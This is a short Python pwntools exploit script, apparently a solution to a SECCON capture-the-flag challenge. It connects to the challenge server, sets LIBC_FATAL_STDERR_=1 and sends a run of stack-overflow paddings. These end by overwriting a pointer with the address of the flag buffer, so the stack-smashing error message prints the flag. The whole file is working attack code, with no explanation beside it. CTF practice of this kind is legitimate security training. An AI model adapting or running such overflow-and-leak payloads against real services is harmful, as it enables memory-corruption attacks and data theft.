#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.28"
#port = 8888
host = "checker.pwn.seccon.jp"
port = 14726
r = remote(host,port)


def sendpad(data):
    r.recvuntil(">>")
    r.sendline(data)
r.recvuntil(":")
r.sendline("LIBC_FATAL_STDERR_=1")
name = 0x601040
flag = 0x6010c0
length = 376
sendpad("a"*(length+8+7))
sendpad("a"*(length+8+6))
sendpad("a"*(length+8+5))
sendpad("a"*(length+8+4))
sendpad("a"*(length+8) + p64(name))
sendpad("a"*(length+7))
sendpad("a"*(length+6))
sendpad("a"*(length+5))
sendpad("a"*(length+4))
sendpad(cyclic(length) + p64(flag))

r.recvuntil(">>")
r.sendline("yes")
r.interactive()
